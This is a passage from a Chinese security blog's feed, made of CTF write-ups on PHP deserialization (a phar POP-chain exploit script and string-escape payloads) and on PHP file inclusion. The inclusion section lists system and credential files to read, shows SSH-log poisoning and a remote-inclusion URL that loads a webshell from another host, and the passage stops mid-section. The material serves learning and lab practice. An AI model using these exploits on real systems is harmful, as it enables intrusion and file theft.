class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//把类当作字符串使用时触发</span>   <span class="token punctuation">{</span>       <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看一下怎么能够触发<code>__toString()</code>方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">test</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>知要echo <code>test</code>即可</p><p>整条链子为</p><pre class="line-numbers language-none"><code class="language-none">C1e4r::destruct() -&gt; Show::toString() -&gt; Test::__get()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>exp如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">C1e4r</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/var/www/html/f1ag.php"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exp.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//生成phar文件</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//触发头是C1e4r类</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exp.txt"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//生成签名</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改生成得phar文件后缀</p><p>上传成功后回到文件读取点来读phar文件</p><p>拿到base64加密得flag</p><p><img src="https://i.loli.net/2021/08/24/Whwx98G4yaKbvEL.png"></p><h1 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h1><h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><p>在反序列化前，对序列化后的字符串进行替换或者修改，使得字符串的长度发生了变化，通过构造特定的字符串，导致对象注入等恶意操作。</p><h2 id="二、字符变多"><a href="#二、字符变多" class="headerlink" title="二、字符变多"></a>二、字符变多</h2><p>例子：</p><p>该题源码如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'x'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'yy'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token double-quoted-string string">"aaa"</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">=</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$r</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文件包含了<code>flag</code></p><p>然后<code>filter()</code>方法，会将序列化字符串中的x替换为yy，可能会导致字符串长度</p><p>我们试着传入<code>u=admin</code></p><p>序列化为：</p><pre class="line-numbers language-none"><code class="language-none">a:2:{i:0;s:5:\"admin\";i:1;s:3:\"aaa\";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反序列化后</p><p><img src="https://i.loli.net/2021/08/25/Gd4msifBVrgOcJQ.png"></p><p>a[1]不等于”admin” 没有满足条件</p><p>我们构造一下数组</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">a:2:{i:0;s:1:"a";i:1;s:5:"admin";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是我们只有一个参数<code>username</code>可控</p><p>可以利用字符串逃逸</p><p>复制自己想要构造的字符串</p><pre class="line-numbers language-none"><code class="language-none">";i:1;s:5:"admin";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>按照长度添加字符串，已知长度为19</p><p>则在前方填充19个x</p><pre class="line-numbers language-none"><code class="language-none">'xxxxxxxxxxxxxxxxxxx";i:1;s:5:"admin";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试一下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'xxxxxxxxxxxxxxxxxxx";i:1;s:5:"admin";}'</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$s</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'x'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'yy'</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$v</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><pre class="line-numbers language-none"><code class="language-none">a:2:{i:0;s:38:"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy";i:1;s:5:"admin";}";i:1;s:1:"a";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到已经逃逸出来了</p><p>这里利用了序列化的特性</p><p>反序列化看一下</p><pre class="line-numbers language-成功逃逸" data-language="成功逃逸"><code class="language-成功逃逸">array(2) {  [0] =&gt;  string(38) "yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy"  [1] =&gt;  string(5) "admin"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以观察整个数据的变化</p><p><img src="https://i.loli.net/2021/08/25/1QgPb694Oia2cTU.png"></p><p>成功逃逸。获得flag</p><h2 id="三、字符变少"><a href="#三、字符变少" class="headerlink" title="三、字符变少"></a>三、字符变少</h2><p>也是拿一道题做例子</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'sec'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$auth</span><span class="token operator">=</span><span class="token double-quoted-string string">"guest"</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">=</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟上一道题差不多</p><p>先随意构造一下争取的payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"u"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"p"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$s</span><span class="token punctuation">;</span><span class="token variable">$v</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'sec'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行后拿到所需部分</p><pre class="line-numbers language-none"><code class="language-none">";i:2;s:5:"admin";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要我们传入的payload</p><pre class="line-numbers language-none"><code class="language-none">u=xxx&amp;p=xxxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>已知两个可控值中间的部分不变（可能会多一位）</p><pre class="line-numbers language-none"><code class="language-none">";i:1;s:1:"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里可以利用替换方法换成空值从而完成逃逸</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"secsecsecsec"</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'";i:1;s:1:"p";i:2;s:5:"admin";}'</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$s</span><span class="token punctuation">;</span><span class="token variable">$v</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'sec'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果</p><pre class="line-numbers language-none"><code class="language-none">a:3:{i:0;s:12:"secsecsecsec";i:1;s:31:"";i:1;s:1:"p";i:2;s:5:"admin";}";i:2;s:5:"admin";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到已经完成了逃逸</p><p>反序列化一下看看</p><pre class="line-numbers language-none"><code class="language-none">array(3) {  [0] =&gt;  string(12) "";i:1;s:31:""  [1] =&gt;  string(1) "p"  [2] =&gt;  string(5) "admin"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/25/lw4D1a3xpSjbrX7.png"></p><p>a[2]=admin 拿到flag</p><p><img src="https://i.loli.net/2021/08/25/aUcp47NDeqkvo93.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://h3h3qaq.github.io/posts/0.html"/>
    <id>https://h3h3qaq.github.io/posts/0.html</id>
    <published>2021-09-29T12:06:39.553Z</published>
    <updated>2021-11-10T14:00:18.830Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr><hr><h1 id="一、文件包含漏洞"><a href="#一、文件包含漏洞" class="headerlink" title="一、文件包含漏洞"></a>一、文件包含漏洞</h1><p>文件包含主要是为了更好地使用代码的重用性，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码，简单点来说就是一个文件里面包含另外一个或多个文件。</p><h1 id="二、漏洞产生原因"><a href="#二、漏洞产生原因" class="headerlink" title="二、漏洞产生原因"></a>二、漏洞产生原因</h1><p>服务器在执行PHP文件的时候，用户可控文件的参数，并且没有严格的检验和过滤，或者被Bypass，操作一些敏感文件来导致文件泄露和恶意代码注入等危害</p><p>举一个简单的例子</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里的<code>filename</code>参数没有经过过滤，直接赋值给<code>include()</code>函数，我们就可以修改<code>filenname</code>的值，执行其他操作</p><p>我们在同目录下创建一个<code>info.txt</code></p><p>内容如下</p><p><img src="https://i.loli.net/2021/09/29/KGvSAi4Ha9VIeR5.png"></p><p>这样我们只需要把<code>info.txt</code>包含进去即可解析</p><p><img src="https://i.loli.net/2021/09/29/f41k8sFO7qRdTGB.png"></p><h1 id="三、PHP常用的包含函数"><a href="#三、PHP常用的包含函数" class="headerlink" title="三、PHP常用的包含函数"></a>三、PHP常用的包含函数</h1><p>在php中，常用的为以下4个函数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中<code>include</code>和<code>require</code>的区别主要是<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p><p><img src="https://i.loli.net/2021/09/29/OSYPlCQxfTcrn29.png"></p><p><code>include_once</code>，<code>require_once</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p><p><img src="https://i.loli.net/2021/09/29/8GWct7SjCYgzXx4.png"></p><h1 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h1><p>文件包含利用有两种</p><pre class="line-numbers language-none"><code class="language-none">1.包含本地服务器的文件2.包含其他服务器的文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>而且，包含的时候，不一定要包含php文件</p><p>只要文件中有一块完整的php代码即可</p><p>例如<code>a.txt</code></p><p>内容为</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php phpinfo(); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也是可以的</p><h2 id="1-包含本地服务器的文件"><a href="#1-包含本地服务器的文件" class="headerlink" title="1.包含本地服务器的文件"></a>1.包含本地服务器的文件</h2><p>举一个例子，利用CTFSHOW的靶机</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里没有做任何限制，我们可以读取任意文件（罗列一些常用的，其他的师傅们可以自行收集）</p><pre class="line-numbers language-none"><code class="language-none">/etc/apache2/*#Apache配置文件，可以获知Web目录、服务端口等信息/etc/nginx/*#Nginx配置文件，可以获知Web目录、服务端口等信息/etc/crontab#定时任务文件/etc/environment#环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况/etc/hostname#主机名/etc/hosts#主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，可以探测网卡信息和内网IP/域名/etc/issue#系统版本信息/etc/mysql/*#MYSQL配置文件/etc/php/*#PHP配置文件/proc 目录#/proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录，如果查看非当前进程的信息，pid是可以进行暴力破解的，如果要查看当前进程，只需/proc/self代替/proc/[pid]即可/proc/[pid]/cmdline#cmdline可读出比较敏感的信息# ssh日志，攻击方法：ssh `&lt;?php phpinfo(); ?&gt;`@192.168.1.1/var/log/auth.log# apache日志/var/log/apache2/[access.log|error.log]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><a href="https://www.anquanke.com/post/id/231407">https://www.anquanke.com/post/id/231407</a></p></blockquote><p>这里可以读取任意文件，我们可以试着读<code>/etc/passwd</code></p><p><img src="https://i.loli.net/2021/09/29/BKbZx2hzpq18kvI.png"></p><h2 id="2-包含远程服务器的文件"><a href="#2-包含远程服务器的文件" class="headerlink" title="2.包含远程服务器的文件"></a>2.包含远程服务器的文件</h2><p>这里需要前提</p><pre class="line-numbers language-none"><code class="language-none">allow_url_fopen = On 是否允许打开远程文件allow_url_include = On 是否允许include/require远程文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里可以本地测试一下，利用虚拟机做远程服务器</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">Include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里存在文件包含漏洞</p><p><img src="https://i.loli.net/2021/09/29/ipOaUYZBuwmlzdT.png"></p><p>“服务器”上存在webshell</p><p>传参：</p><pre class="line-numbers language-none"><code class="language-none">http://localhost/include.php?page=http://192.168.179.129/1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/09/29/HZT1fJxPSLtVd6m.png"></p><p>可以看到成功包含到了webshell</p><h2 id="3-限制后缀名"><a href="#3-限制后缀名" class="headerlink" title="3.限制后缀名"></a>3.限制后缀名</h2><p>例子</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span> <span class="token double-quoted-string string">".H3h3QAQ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，在进行包含文件的时候文件名后缀进行了拼接，强制后缀为<code>H3h3QAQ</code></p><p>所以我们需要Bypass</p><h3 id="1-00截断"><a href="#1-00截断" class="headerlink" 